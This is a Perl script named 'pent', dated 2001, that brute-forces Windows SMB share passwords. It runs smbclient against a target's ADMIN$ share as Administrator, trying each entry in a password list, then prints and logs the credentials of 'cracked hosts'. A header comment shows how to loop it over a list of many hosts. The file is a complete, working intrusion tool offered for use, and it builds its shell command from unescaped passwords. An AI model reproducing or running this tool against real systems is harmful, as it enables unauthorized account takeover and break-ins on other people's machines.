#!/usr/bin/perl -w
# nt share brute forcer, by methodic in 2001
#
# the only thing you need installed is smbclient, which can be found at
# samba.org
#
# if you have a list of hosts you want to brute force, you can do this:
# for i in `cat hosts.txt`; do ./pent -t $i -l passwds.txt; done
#
# greets to all of the angrypacket crew [http://sec.angrypacket.com]

use Getopt::Std;
use POSIX ":sys_wait_h";

getopts("t:l:s:u:f:", \%args);

print "** pent by methodic [methodic\@slartibartfast.angrypacket.com]\n";

# parse options.. this may be ugly, but it gets the job done :P
if($args{t} && $args{l}) {
	$target = $args{t};

	# open the password list and store them into an array
	open(PWLIST, "<$args{l}") or die "!! fatal: couldn't open $args{l}\n";
	@passwords = <PWLIST>;
	close(PWLIST);
	# get rid of all newline characters and count the array elements
	chomp(@passwords);
	$num = @passwords;

	if($args{s}) {
		$share = $args{s};
	} else {
		$share = "ADMIN\$";
	}
	if($args{u}) {
		$username = $args{u};
	} else {
		$username = "Administrator";
	}
	$log = 0;
	if($args{f}) {
		open(LOGFILE, ">>$args{f}") or die "-- couldn't open $args{f}, not logging\n";
		$log = 1;
	}
} else {
	usage();
}


print "++ starting pent [target: $target, $num passwords] (pid=$$)\n";
$start_time = time();

$cur = $num;
$status = "0.00";
print "++ percent complete: $status\%";
foreach $password (@passwords) {
	$smb_cmd = qq{smbclient //$target/$share $password -U $username -c dir 1>/dev/null 2>/dev/null};
	$test = system($smb_cmd);
	if($test == 0) {
		$end_time = time();
		# blank password
		if(!($password)) {
			$password = "blank, not set";
		}
		print "\n>> success: password for $username on $target is $password\n";
		if($log == 1) {
			print LOGFILE "## cracked host ##\nhost: $target, username: $username, password: $password\n";
			close(LOGFILE);
		}
		print ">> brute force took ";
		&calculate_time($end_time - $start_time);
		exit(0);
	}
	for($i = 0; $i <= length($status); $i++) {
		print "\b";
	}
	$cur--;
	$status = sprintf("%.2f", (($num - $cur) / $num) * 100);
	print "$status\%";
}

print "\n>> failed: couldn't crack password for $username on $target\n";

sub calculate_time {
	my($elapsed_time) = @_;
	if($elapsed_time > 59 ) {
		$minutes = $elapsed_time / 60;
		($minutes, $junk) = split(/\./, $minutes);
		$junk = 0;
		$seconds = $elapsed_time % 60;
		print "$minutes minute";
		if($minutes != 1) {
			print "s";
		}
		print " and $seconds second";
		if($seconds != 1) {
			print "s";
		}
		print "\n";
	} else {
		print "$elapsed_time second";
		if($elapsed_time != 1) {
			print "s";
		}
		print "\n";
	}
}

sub usage {
	die <<USAGE;
Usage: $0 -t <target machine> -l <password list>
	-s <share to connect to>	[default: ADMIN\$]
	-u <username>			[default: Administrator]
	-f <output file>		[log cracked hosts]
USAGE
}
